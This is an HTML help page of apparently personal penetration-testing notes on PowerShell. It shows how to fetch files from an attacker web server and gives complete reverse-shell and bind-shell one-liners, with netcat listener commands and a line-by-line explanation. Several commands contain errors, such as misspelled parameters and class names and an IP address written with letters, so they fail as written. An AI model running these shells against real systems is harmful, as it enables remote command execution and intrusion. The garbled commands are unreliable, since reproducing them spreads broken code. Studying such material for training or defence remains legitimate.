
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- saved from url=(0014)about:internet -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>PowerShell</title>
<meta name="GENERATOR" content="WinCHM">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style>
html,body { 
	/* Default Font */
	font-family: Arial, Helvetica, sans-serif;
	font-size: 11pt;
}
</style>



<meta http-equiv="X-UA-Compatible" content="IE=8">
<style>
html {
	overflow-y:scroll;
}

body {
	padding: 0px;
	margin: 0px;
	overflow: auto; 
	background-color: #FFFFFF; 
}

#winchm_template_top{
	margin: 0px;
	padding-top: 10px;
	padding-left: 5px;
	padding-bottom: 10px;
	padding-right: 10px;

	font-family: arial, helvetica, sans-serif;
	font-size: 35px;
	font-style: normal;
	font-weight: normal;
	color: #FFFFFF;

	border-bottom-style: solid;
	border-bottom-width: 4px;
	border-bottom-color: #000000;

	width: auto;
	background-color: #FFFFFF;
	text-align: left;
	background-image: url('template/hgrad.png');
	background-repeat: no-repeat;
	
}

#winchm_template_navigation{
	margin-top: 0px;
	margin-left: 0px;
	margin-bottom: 0px;
	margin-right: 0px;

	padding-top: 7px;
	padding-left: 5px;
	padding-bottom: 6px;
	padding-right: 5px;

	font-family: arial, helvetica, sans-serif;
	font-size: 10px;
	font-style: normal;
	font-weight: normal;
	color: #808080; 

	border-top-style: solid;
	border-top-width: 3px;
	border-top-color: #C1C1C1;

	border-bottom-style: solid;
	border-bottom-width: 1px;
	border-bottom-color: #DBDBDB;
	
	background-color: #FFFFFF;
	width: auto;
}

#winchm_template_button{
	float: right;
	top: -3px;
	position: relative;
	text-align: right;
	right: -5px;
	height: auto;
}

#winchm_template_title {
	padding: 0px;
	margin-top: 15px;
	margin-left: 0px;
	margin-bottom: 15px;
	margin-right: 0px;

	font-family: Tahoma, Geneva, sans-serif;
	font-size: 22px;
	font-weight: bold;
	color: #005680;
	text-align: center;
	width: auto;
	background-color: #FFFFFF;

}
#winchm_template_content{
	padding: 0px;
	margin-top: 15px;
	margin-left: 15px;
	margin-bottom: 15px;
	margin-right: 15px;

	width: auto  !important;
	width: 100%;
}

#winchm_template_footer{
	border-width: 1px;
	border-color: #c0c0c0;
	border-top-style: solid;
	
	margin-top: 0px;
	margin-left: 15px;
	margin-bottom: 5px;
	margin-right: 15px;

	padding-top: 6px;
	padding-left: 0px;
	padding-bottom: 20px;
	padding-right: 0px;

	font-family: arial, helvetica, sans-serif;
	font-size: 11px;
	color: #909090;

	text-align: center;	
	width: auto;	
}

#winchm_template_navigation a:link	{text-decoration: none;color: #0000ff}
#winchm_template_navigation a:visited  {text-decoration: none; color: #0000ff}
#winchm_template_navigation a:active {text-decoration: none; color: #0000ff}
#winchm_template_navigation a:hover {text-decoration: none;color: #0000ff}

a:link	{text-decoration: underline; color:#0033cc}
a:visited  {text-decoration: underline; color: #0033cc}
a:active {text-decoration: underline; color: #0033cc }
a:hover {text-decoration: underline;color: #ff0000;}

@media print
{
#winchm_template_button{
visibility:hidden;
}
}
</style>
</head>

<body><script language="JavaScript" type="text/JavaScript">
function syn(){
if(parent.nav.tree){
 if(parent.nav.tree.loaded){
  parent.nav.tree.selectNode(30);
 }else{
  setTimeout("syn()",500);
}
  }else{
  setTimeout("syn()",500);
  }}
if(parent!=self){
  setTimeout("syn()",100);
}else{
  parent.location.href = "../index.htm?page=PowerShell.htm";
}
originalOnload = window.onload;
if(originalOnload==null){
window.onload = function(){parent.contentLoaded = true;};
}else{
window.onload = function(){originalOnload();parent.contentLoaded = true;};
}
</script> 


<div id="winchm_template_top"><div id="winchm_template_button"><A href="Socat.htm" title="Previous topic"><img id="winchm_template_prev" alt="Previous topic" src="template/btn_prev_n.gif" border="0"></a><A href="Powercat.htm" title="Next topic"><img id="winchm_template_next" alt="Next topic" src="template/btn_next_n.gif" border="0"></a></div>
<nobr><IMG align=absMiddle src="template/logo.png" width=40 height=40 style="HEIGHT: 55px; WIDTH: 74px">&nbsp;<FONT size=6><STRONG>COMPUTER</STRONG></FONT></nobr></div>
<div id="winchm_template_navigation">Computer &gt; 
Networking &gt; Tools &gt; </div>
<div id="winchm_template_title">PowerShell</div>
<div id="winchm_template_content">
<P><FONT size=3>Windows PowerShell is a task-based command 
line shell and scripting language. </FONT>         
 </P>
<UL>
  <LI>
<DIV><FONT size=3><FONT face="Courier New">PS 
  c:\win&gt;</FONT> PowerShell Prompt, <FONT face="Courier New">c:\win&gt;</FONT> Command Prompt </FONT>         
 </DIV>
  <LI>
<DIV><FONT size=3>PowerShell execution policy determine 
  which PowerShell scripts can be run. The default policy is "Restricted", 
  meaning the system will neither load PowerShell configuration files nor run 
  PowerShell scripts. </FONT>         
 </DIV>
  <LI>
<DIV><FONT size=3><SPAN class=code><FONT face="Courier New">Run 
  as Administrator &gt; PS c:\win&gt; Set-ExecutionPolicy 
  Unristricted</FONT></SPAN> </FONT>         
 </DIV>
  <LI>
<DIV><SPAN class=code><FONT size=3><SPAN class=code><FONT face="Courier New">PS c:\win&gt; Get-ExecutionPolicy</FONT></SPAN> : to check the current execution 
  policy</FONT>    
     </SPAN>         
 </DIV></LI></UL><SPAN class=code>
<H3 class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">Downloading 
File</H3>
<P class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
class=code><FONT size=3 face="Courier New">kali@linux:~$ sudo cp 
/usr/share/windows-resources/binaries/wget.exe /var/www/html/</FONT>    
</SPAN></P>
<UL>
  <LI>
  <DIV class=p 
  style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
  class=code><FONT size=3>copy the 
  wget file to be transfered</FONT>      </SPAN></DIV></LI></UL><SPAN 
class=code>
<DIV class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
class=code><SPAN class=code><FONT size=3 face="Courier New">kali@linux:~$ sudo systemctl 
start apache2</FONT>    
</SPAN></SPAN></DIV></SPAN>
<UL>
  <LI><FONT size=3>starts the apache2 html web 
  server</FONT>     </LI></UL>
  <P><SPAN class=code><SPAN class=de_5383D053C4><FONT size=3 face="Courier New">c:\win&gt; powershell -c "(new-object 
System.Net.WebClinet).DownloadFile('http://10.11.0.4/wget.exe','c:\Users\Desktop\wget.exe')"</FONT></SPAN></SPAN>     </P>
<UL>
  <LI>
  <DIV><SPAN class=code><SPAN class=de_5383D053C4><FONT size=3>-c to execute the command (in double-quotes) as if it were typed at the 
  PowerShell prompt.</FONT></SPAN></SPAN>     </DIV></LI>
  <LI>
  <DIV><SPAN class=code><SPAN class=de_5383D053C4><FONT size=3>new-object cmdlet allows to instantiate either a .Net Framework or a 
  COM object.</FONT></SPAN></SPAN>     </DIV></LI>
  <LI>
  <DIV><SPAN class=code><SPAN class=de_5383D053C4><FONT size=3>WebClient class, in the System.Net namespace. The WebClient class is 
  used to access resources identified by a URL.</FONT></SPAN></SPAN>     </DIV></LI>
  <LI>
  <DIV><SPAN class=code><SPAN class=de_5383D053C4><FONT size=3>DownloadFIle method in WebClient class, which requires a source and a 
  target location.</FONT></SPAN></SPAN>     </DIV></LI></UL><SPAN class=code><SPAN 
class=de_5383D053C4>
<H3 class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">Reverse 
Shell</H3>
<UL>
  <LI>
  <DIV class=p 
  style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
  class=code><FONT size=3 face="Courier New">kali@attacker:~$ sudo nc -lnvp 
  443</FONT></SPAN></DIV></LI>
  <LI>
  <DIV class=p 
  style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
  class=code><SPAN class=code><FONT size=3 face="Courier New">c:\target&gt; 
  powershell -c "$client = New-Object 
  System.Net.Sockets.TCPClient('l0.ll.0.4',443);$stream = 
  $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = 
  $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName 
  System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 
  2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; 
  ';$sendbyte = 
  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</FONT></SPAN></SPAN></DIV></LI></UL><SPAN 
class=code><SPAN class=code>
<P class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">
<TABLE style="BORDER-COLLAPSE: collapse" borderColor=#000000 cellSpacing=0 
cellPadding=2 width="100%" border=1>
  
  <TR>
    <TD>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">$client = New-Object 
      System.Net.Sockets.TCPClient('l0.ll.0.4',443);</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">$stream = 
      $client.GetStream();</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">[byte[]]$bytes = 
      0..65535|%{0};</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">while(($i = $stream.Read($bytes, 0, 
      $bytes.Length)) -ne 0)</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">{</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 50px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">$data = (New-Object -TypeName 
      System.Text.ASCIIEncoding).GetString($bytes,0, $i);</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 50px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">$sendback = (iex $data 2&gt;&amp;1 | 
      Out-String );</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 50px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">$sendback2 = $sendback + 'PS ' + 
      (pwd).Path + '&gt; ';</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 50px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">$sendbyte = 
      ([text.encoding]::ASCII).GetBytes($sendback2);</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 50px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">$stream.Write($sendbyte,0,$sendbyte.Length);</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 50px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">$stream.Flush();</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">}</FONT></SPAN></DIV>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
      class=code><FONT face="Courier New">$client.Close();</FONT></SPAN>&nbsp;</DIV></TD></TR>
  <TR>
    <TD><SPAN class=code><FONT face="Courier New">client</FONT> 
      </SPAN>variable (target IP, Port), <SPAN class=code><FONT face="Courier New">stream</FONT></SPAN> variable, <SPAN class=code><FONT face="Courier New">byte</FONT> </SPAN>array called <SPAN class=code><FONT face="Courier New">bytes</FONT></SPAN>, <SPAN class=code><FONT face="Courier New">while</FONT></SPAN> loop (<SPAN class=code><FONT face="Courier New">iex</FONT></SPAN> cmdlet runs any string it receives as 
      a command and the results are then sent back via the data stream) and a 
      call to close the client connection.&nbsp;&nbsp;</TD></TR></TABLE></P>
<H3 class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">Bind 
Shell</H3>
<UL>
  <LI>
  <DIV class=p 
  style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><FONT face="Courier New"><FONT size=3><SPAN class=code>c:\target&gt; powershell -c 
  </SPAN>"<SPAN class=code>$listener = New-Object 
  System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = 
  $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 
  0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 
  0){;$data = (New-Object -TypeName 
  System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 
  2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; 
  ';$sendbyte = 
  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()</SPAN>"</FONT></FONT></DIV></LI>
  <LI>
  <DIV class=p 
  style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><SPAN 
  class=code><FONT size=3 face="Courier New">kali@attacker:~$ nc -nv 10.11.0.22 
  443</FONT></SPAN></SPAN></SPAN></SPAN></SPAN></DIV></LI></UL></SPAN></div>
<div id="winchm_template_footer" align=center>Copyright © 2021 by Mridul Dixit<br> All rights reserved.</div>

</body>
</html>
